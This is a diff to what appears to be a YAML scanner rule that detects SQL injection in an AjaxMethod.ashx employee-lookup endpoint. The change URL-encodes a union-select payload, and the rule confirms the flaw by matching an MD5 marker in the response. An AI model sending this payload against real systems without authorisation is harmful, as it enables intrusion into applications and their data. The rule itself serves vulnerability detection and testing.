@@ -5,7 +5,7 @@ rules:
     sqli:
         request:
             method: GET
-            path: /Ajax/AjaxMethod.ashx?action=getEmpByname&Name=Y' union select substring(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','89888')),3,32)--
+            path: /Ajax/AjaxMethod.ashx?action=getEmpByname&Name=Y'+union+select+substring(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','89888')),3,32)--
         expression: response.status == 500 && "00a6b8560ba509f8ca05d4373efb0e9d".bmatches(response.body)
 expression: sqli()
 detail:
